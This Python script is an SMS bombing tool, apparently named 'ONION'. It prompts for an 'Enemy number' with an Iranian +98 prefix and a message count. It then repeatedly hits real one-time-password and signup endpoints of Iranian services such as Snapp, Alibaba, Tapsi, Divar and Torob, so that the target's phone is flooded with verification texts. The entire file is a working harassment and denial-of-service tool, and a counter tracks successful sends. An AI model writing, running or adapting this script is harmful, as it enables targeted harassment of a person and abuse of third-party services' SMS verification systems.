
from requests import post , get
from time import sleep
from os import system , name


def logo() :
 print(color.RED+"""
\n
 ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░ 
    ░ ░           ░  ░      ░ ░           ░ </OƝioN
"""+color.GREEN)


# change str color in terminal
class color: 
    GREEN = '\033[92m'
    RED = '\033[91m'
   
class color: 
    GREEN = '\033[92m'
    RED = '\033[91m'

# define our clear function
def clear():
    #for win
    if name == 'nt':
        _ = system('cls')
    
    else:
        _ = system('clear')


# append in sended:
#                     1 for site return code 200                 ok
#                     0 for site return code somting not 200     error
#                    -1 for internet error                       error
#                     2 for site mabey dont send bot return 200
sended = []

# print or return script status
def log(looping_count, sms_number, phone_number):
    clear()
    logo()

    return_200 = str(sended.count(1))
    return_error = str(sended.count(0))
    return_internet_error = str(sended.count(-1))

    print("----------------------------------------------------")
    print("[-] target : 98 {}".format(phone_number))
    print("\n\n[*] send : {}/{}    site error : {}    internet error : {}".format(return_200, sms_number, return_error, return_internet_error))
    print("\n[*] all lo0ping script : {}".format(looping_count))
    print("----------------------------------------------------")


# dos loop
 
def start():
    looping_count = 0

    clear()
    # input data
    logo()
    print("\n\n")
    phone_number = str(input("[ ] Enemy number :\n>> +98 "))
    sms_number = int(input("[ ] Number of sms :\n>> "))

    while looping_count <= sms_number:

        if sended.count(1) >= sms_number:
            clear()
            log(looping_count, sms_number, phone_number)
            print("\n[ ] Done, I sent more than {} sms to +98 {}\n".format(sms_number, phone_number ))
            break
        
        else:
            # print status log
            log(looping_count, sms_number, phone_number)

            looping_count = looping_count + 1
            
            # run site function'
            snap(phone_number)
            sleep(1)
            tamland(phone_number)
            sleep(1)
            alibaba(phone_number)
            sleep(.5)
            tapsi(phone_number)
            sleep(1)
            divar(phone_number)
            sleep(1)
            sbm24(phone_number)
            sleep(.5)
            anten(phone_number)
            sleep(1)
            snap_doctor(phone_number)
            sleep(1)
            togmond(phone_number)
            sleep(.5)
            torob(phone_number)
            sleep(1)
            limited_sites(phone_number)
            sleep(1)
            snap_room(phone_number)
            
            
            

            # sleep time after 1 looping
            #sleep(1)



# 001 snap
def snap(phone_number):
    try:
        phone_number = "+98" + phone_number
        data = {"cellphone":phone_number}
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[snap] send post and : {}".format(p))
            
        else:
            print("[-snap] not send , error code:{}".format(p))
            sended.append(0)
    except:
        print("[-snap] not send check internet or somting..")
        sended.append(-1)
        


# 002 tamland
def tamland(phone_number):
    try:
        phone_number = "0" + phone_number
        

        data = {"Mobile":phone_number,"SchoolId":-1}
        url = "https://api.famiran.com/api/user/signup"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[tamland] send post and : {}".format(p))
            
        else:
            print("[-tamland] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-tamland] not send check internet or somting..")
        sended.append(-1)
        


# 003 alibaba 
def alibaba(phone_number):
    try:
        phone_number = phone_number
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        data = {"phoneNumber":phone_number}
        p = post(url, json=data, timeout=3)
        sleep(.01)
        
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[alibaba] send post and : {}".format(p))
            
        else: 
            print("[-alibaba] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-alibaba] not send check internet or somting..")
        sended.append(-1)

# 004 tapsi -limit
def tapsi(phone_number):
    try:
        phone_number = "0" + phone_number
        data = {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"}}
        url = "https://tap33.me/api/v2/user"
        p = post(url, json=data, timeout=2 )
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[tapsi] send post and : {}".format(p))
        else:
            print("[-tapsi] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-tapsi] not send check internet or somting..")
        sended.append(-1)

# 005 divar
def divar(phone_number):
    try:
        phone_number = phone_number
        data = {"phone":phone_number}
        url = "https://api.divar.ir/v5/auth/authenticate"
        p = post(url, json=data, timeout=2)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[divar] send post and : {}".format(p))
        else:
            print("[-divar] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-divar] not send check internet or somting..")
        sended.append(-1)


# 006 sbm24 -limit
def sbm24(phone_number):
    try:
        data = {}
        url = "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[sbm24] send post and : {}".format(p))
        else:
            print("[-sbm24] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-sbm24] not send check internet or somting..")
        sended.append(-1)



# 007 snap market
def snap_market(phone_number):
    try:

        data = {}
        url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{}&dummy=1603885783456".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[snap_market] send post and : {}".format(p))
        else:
            print("[-snap_market] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-snap_market] not send check internet or somting..")
        sended.append(-1)



# 008 anten *
def anten(phone_number):
    try:
        phone_number = '0'+phone_number
        data = {"phone":phone_number}
        url = "https://api2.anten.ir/users/"
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[anten] send post and : {}".format(p))
        else:
            print("[-anten] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-anten] not send check internet or somting..")
        sended.append(-1)


# 009 snap doctor *
def snap_doctor(phone_number):
    try:
        url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98)".format(phone_number)
        p = get(url, timeout=3)
        rp = p.json()
        rp = rp["result"]
        sleep(.01)
        if rp == "SUCCESS":
            sended.append(1)
            print("[snap doctor] send get and : {}".format(rp))
    except:
        print("[-snap doctor] not send check internet or somting..")
        sended.append(-1)


# 010 togmond *
def togmond(phone_number):
    try:
        phone_number = phone_number
        data = "utf8=%E2%9C%93&phone_number=0{}".format(phone_number)
        url = "https://tagmond.com/phone_number"
        p = post(url, data=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(2) # for 10 try : dont send sms bot return 200!
            print("[togmond] send post and : {}".format(p))
        else:
            print("[-togmond] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-togmond] not send check internet or somting..")
        sended.append(-1)


# 011 torob
def torob(phone_number):
    try:
        url = "https://api.torob.com/a/phone/send-pin/?phone_number=0{}".format(phone_number)
        p = get(url, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[torob] send post and : {}".format(p))
        else:
            print("[-torob] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-torob] not send check internet or somting..")
        sended.append(-1)


# 012 lomited sites
def limited_sites(phone_number):
    try:
        data = {"username":phone_number}     
        url = "https://www.tebinja.com/api/v1/users"
        post(url, json=data, timeout=1)
        sleep(.01)
    except:
        sended.append(2)
    
# 013 snap room
def snap_room(phone_number):
    try:
        data = {"username":"0"+phone_number}    
        url = "https://napi.snapproom.com/users/self/verification-flow"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[snap room] send post and : {}".format(p))
        else:
            print("[-snap room] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-snap room] not send check internet or somting..")
        sended.append(-1)

site_function = 13

if __name__ == "__main__":
    start()







